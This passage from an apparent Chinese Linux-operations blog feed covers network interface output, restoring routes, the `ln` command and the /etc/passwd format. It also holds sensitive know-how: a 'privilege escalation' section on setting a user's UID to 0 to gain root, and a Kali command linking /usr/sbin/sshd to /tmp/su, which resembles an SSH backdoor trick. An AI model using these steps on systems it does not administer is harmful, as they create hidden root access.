a</span><br><span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">16436</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">3</span>: eth1: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">85</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">4</span>: eth2: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">86</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">5</span>: eth3: <span class="hljs-variable">&lt;BROADCAST,MULTICAST&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noop <span class="hljs-keyword">state</span> DOWN qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">87</span> brd ff:ff:ff:ff:ff:ff<br><span class="hljs-number">8</span>: eth0.<span class="hljs-number">100</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">10.122</span>.<span class="hljs-number">11.73</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.122</span>.<span class="hljs-number">11.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">100</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">11</span>: eth0.<span class="hljs-number">200</span>@eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc noqueue <span class="hljs-keyword">state</span> UP <br>    link/ether <span class="hljs-number">74</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span>a:e9:<span class="hljs-number">6</span>d:<span class="hljs-number">84</span> brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">27.221</span>.<span class="hljs-number">32.56</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">27.221</span>.<span class="hljs-number">32.255</span> scope <span class="hljs-keyword">global</span> eth0.<span class="hljs-number">200</span><br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">7686</span>:<span class="hljs-number">7</span>aff:fee9:<span class="hljs-number">6</span>d84/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h2 id="禁用网卡-1"><a href="#禁用网卡-1" class="headerlink" title="禁用网卡"></a>禁用网卡</h2><p>语法：</p><p>ifdown <device name></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> tmp]<span class="hljs-meta"># ifdown <span class="hljs-string">&quot;eth0.200&quot;</span></span><br></code></pre></td></tr></table></figure><p>ifconfig <device name> down</p><h2 id="启用网卡"><a href="#启用网卡" class="headerlink" title="启用网卡"></a>启用网卡</h2><p>语法：</p><p>ifup <device name></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><h3 id="网络不通"><a href="#网络不通" class="headerlink" title="网络不通"></a>网络不通</h3><h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><p>操作网卡可能会导致对应网卡路由丢失，从而导致网络不通</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>备份路由，恢复路由</p><p>1、操作网卡之前备份路由，恢复路由</p><p>route 或 route -n</p><p>2、如果没有备份路由，可以尝试查看&#x2F;etc&#x2F;rc.local文件找路由信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@localhost /]# cat /etc/rc.local<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This script will be executed *after* all the other init scripts.</span><br><span class="hljs-comment"># You can put your own initialization stuff in here if you don&#x27;t</span><br><span class="hljs-comment"># want to do the full Sys V style init stuff.</span><br><br>touch /var/lock/subsys/local<br>/var/cfengine/bin/cfagent -qvv; sleep 60; /var/cfengine/bin/cfagent -qvv<br>modprobe toa<br>/etc/rc3.d/S27route<br><br>[root@localhost /]# cat /etc/rc3.d/S27route<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.74.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.78.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.48.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.68.0.0/16 gw 218.xx.xx.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 10.0.0.0/8 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 172.16.0.0/16 gw 172.16.108.1<br>/sbin<span class="hljs-built_in">/route </span><span class="hljs-built_in">add</span> -net 192.168.0.0/16 gw 172.16.108.1<br><br></code></pre></td></tr></table></figure><p>执行对应的路由操作即可</p><p>处理前后对比</p><p>处理前，内网eth1不通的路由</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@localhost ata]<span class="hljs-comment"># route </span><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>218.xx.xx.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>172.16.108.0    *               255.255.255.0   U    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.48.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.68.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>10.74.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1002 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>link-local      *               255.255.0.0     U    <span class="hljs-number"> 1003 </span> <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth1<br>10.78.0.0       218.xx.xx.1    255.255.0.0     UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br>default         218.xx.xx.1    0.0.0.0         UG   <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 0 </span>eth0<br></code></pre></td></tr></table></figure><p>处理前，内网eth1通的路由</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[root@localhost /]</span># route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.108.0</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.48.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.68.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">172.16.0.0</span>      <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.74.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1002</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">169.254.0.0</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">1003</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">192.168.0.0</span>     <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">10.78.0.0</span>       <span class="hljs-number">218</span>.xx.xx.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br><span class="hljs-number">10.0.0.0</span>        <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>       UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth1<br><span class="hljs-number">0.0.0.0</span>         <span class="hljs-number">218</span>.<span class="hljs-number">30</span>.<span class="hljs-number">108</span>.<span class="hljs-number">1</span>    <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ln</title>
    <link href="/2024/04/03/yunwei/commands/ln/"/>
    <url>/2024/04/03/yunwei/commands/ln/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为文件创建链接，默认创建的均为硬链接</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><strong>ln [OPTION]… [-T] TARGET LINK_NAME</strong></p><p>为TARGET创建链接为LINK_NAME</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">(base) [root@110 ~]# ln /etc/passwd <span class="hljs-keyword">test</span><br>(base) [root@110 ~]# <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> <span class="hljs-keyword">test</span><br>-rw-r--r-- 2 root root 1343 <span class="hljs-keyword">Dec</span> 16 00:13 <span class="hljs-keyword">test</span><br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET</strong></p><p>为TARGET创建链接在当前目录</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> test]<span class="hljs-meta"># ln /etc/passwd</span><br>(base) [root<span class="hljs-symbol">@110</span> test]<span class="hljs-meta"># ls</span><br>passwd<br>(base) [root<span class="hljs-symbol">@110</span> test]<span class="hljs-meta"># ls -ilh passwd</span><br><span class="hljs-number">932192</span> -rw-r--r-- <span class="hljs-number">2</span> root root <span class="hljs-number">1.4</span>K <span class="hljs-built_in">Dec</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>:<span class="hljs-number">13</span> passwd<br>(base) [root<span class="hljs-symbol">@110</span> test]<span class="hljs-meta"># ls -ilh /etc/passwd</span><br><span class="hljs-number">932192</span> -rw-r--r-- <span class="hljs-number">2</span> root root <span class="hljs-number">1.4</span>K <span class="hljs-built_in">Dec</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>:<span class="hljs-number">13</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET… DIRECTORY</strong><br><strong>ln [OPTION]… -t DIRECTORY TARGET…</strong></p><p>创建指向DIRECTORY中的每个TARGET的链接</p><p>参数</p><p>-s, –symbolic</p><p>make symbolic links instead of hard links</p><p>使用符号链接（软连接）替换硬链接</p><p>-f, –force</p><p>remove existing destination files</p><p>删除已有的目标文件，避免出现</p><p><strong>备注</strong></p><p>1、默认为硬链接。</p><p>2、LINK_NAME（也就是链接名）必须为不存在的，也就是链接名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali2021)-[~]<br>└─<span class="hljs-comment"># ln /usr/sbin/sshd /tmp/su</span><br><span class="hljs-built_in">ln</span>: 无法创建硬链接 <span class="hljs-string">&#x27;/tmp/su&#x27;</span>: 文件已存在<br></code></pre></td></tr></table></figure><p>3、硬链接时，源文件必须存在</p><p>4、软连接时，源文件可不存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 <span class="hljs-built_in">test</span>]<span class="hljs-comment"># ln -s /etc/passwds passwds</span><br>(base) [root@110 <span class="hljs-built_in">test</span>]<span class="hljs-comment"># ls -lia passwds</span><br>918146 lrwxrwxrwx 1 root root 12 Jan  3 15:05 passwds -&gt; /etc/passwds<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>passwd</title>
    <link href="/2024/04/03/yunwei/commands/passwd/"/>
    <url>/2024/04/03/yunwei/commands/passwd/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h1><p>存储账户的文件</p><p>只能是管理员修改，其他用户只有可读权限</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ll  <span class="hljs-string">/etc/passwd</span><br>-rw-r<span class="hljs-params">--r--</span> 1 root root 1414 Aug 22 09<span class="hljs-function">:16</span> <span class="hljs-string">/etc/passwd</span><br></code></pre></td></tr></table></figure><p>内容示例：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) [root<span class="hljs-variable">@110</span> skel]<span class="hljs-comment"># cat /etc/passwd</span><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">adm:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:adm</span><span class="hljs-symbol">:/var/adm</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">shutdown:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/shutdown</span><br><span class="hljs-symbol">halt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:halt</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/halt</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/spool/mail</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">operator:</span><span class="hljs-symbol">x:</span><span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:operator</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:FTP</span> <span class="hljs-title class_">User</span><span class="hljs-symbol">:/var/ftp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">99</span><span class="hljs-symbol">:</span><span class="hljs-number">99</span><span class="hljs-symbol">:Nobody</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">192</span><span class="hljs-symbol">:</span><span class="hljs-number">192</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dbus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">81</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:System</span> message <span class="hljs-symbol">bus:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">polkitd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">997</span><span class="hljs-symbol">:User</span> <span class="hljs-keyword">for</span> <span class="hljs-symbol">polkitd:</span>/<span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">postfix:</span><span class="hljs-symbol">x:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-number">89</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/spool/postfix</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">chrony:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/chrony</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">74</span><span class="hljs-symbol">:</span><span class="hljs-number">74</span><span class="hljs-symbol">:Privilege-separated</span> <span class="hljs-variable constant_">SSH</span><span class="hljs-symbol">:/var/empty/sshd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ntp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/etc/ntp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-number">72</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nscd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">28</span><span class="hljs-symbol">:</span><span class="hljs-number">28</span><span class="hljs-symbol">:NSCD</span> <span class="hljs-title class_">Daemon</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">redis:</span><span class="hljs-symbol">x:</span><span class="hljs-number">997</span><span class="hljs-symbol">:</span><span class="hljs-number">993</span><span class="hljs-symbol">:Redis</span> <span class="hljs-title class_">Database</span> <span class="hljs-title class_">Server</span><span class="hljs-symbol">:/var/lib/redis</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">dovecot:</span><span class="hljs-symbol">x:</span><span class="hljs-number">97</span><span class="hljs-symbol">:</span><span class="hljs-number">97</span><span class="hljs-symbol">:Dovecot</span> <span class="hljs-variable constant_">IMAP</span> <span class="hljs-symbol">server:</span>/usr/libexec/<span class="hljs-symbol">dovecot:</span>/sbin/nologin<br><span class="hljs-symbol">dovenull:</span><span class="hljs-symbol">x:</span><span class="hljs-number">996</span><span class="hljs-symbol">:</span><span class="hljs-number">992</span><span class="hljs-symbol">:Dovecot<span class="hljs-string">&#x27;s unauthorized user:/usr/libexec/dovecot:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">saslauth:x:995:76:Saslauthd user:/run/saslauthd:/sbin/nologin</span></span><br><span class="hljs-string"><span class="hljs-symbol">apache:x:1001:1001::/home/apache:/bin/bash</span></span><br></code></pre></td></tr></table></figure><p>第一列：账户名</p><p>第二列：原本用于保存密码，现在密码都保存在&#x2F;etc&#x2F;shadow文件，所有都用x替代</p><p>第三列：UID，用户ID，默认管理员(root)为0，也就是0表示为特权账户；1-1000默认为系统用户；也就是正常useradd添加的用户，UID都是大于1000的。</p><p>第四列：GID，用户组ID，和UID相似</p><p>第五列：用户说明</p><p>第六列：用户家目录</p><p>第七列：用户使用的shell</p><p>权限提升：</p><p>指定用户的uid修改为0，即可成为特权用户root，也就是说会有root的权限，也有root的限制，例如：如果有设置root不可登录，提升权限的用户也不可登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt;ssh test123@<span 